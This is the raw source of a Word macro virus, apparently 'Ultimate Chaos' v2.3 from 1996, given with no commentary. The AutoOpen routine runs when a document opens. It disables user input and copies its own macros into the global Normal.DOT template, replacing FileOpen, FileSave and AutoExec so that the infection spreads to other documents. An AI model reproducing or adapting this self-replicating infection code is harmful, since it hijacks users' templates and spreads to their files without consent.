   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()

   WordBasic.DisableInput

   On Error GoTo -1: On Error GoTo Error_Handler

   '*********************************
   '* -x        UlTiMaTe         x- *
   '* CCCCC H   H AAAAA OOOOO SSSSS *
   '* C     H   H A   A O   O S     *
   '* C     HHHHH AAAAA O   O SSSSS *
   '* C     H   H A   A O   O     S *
   '* CCCCC H   H A   A OOOOO SSSSS *
   '* -x  v2.3 - 1st June, 1996  x- *
   '*********************************

   WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempFileOpen", "Normal.DOT:FileOpen"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempFileSave", "Normal.DOT:FileSave"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempAutoExec", "Normal.DOT:AutoExec"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Normal.DOT:TempAutoOpen"

   GoTo Finished

   Error_Handler:
   Select Case Err.Number
       Case 24
       Case Else
           WordBasic.Beep
           WordBasic.PrintStatusBar "Unexpected error!  Error code -", Err.Number
   End Select

   Finished:

   End Sub
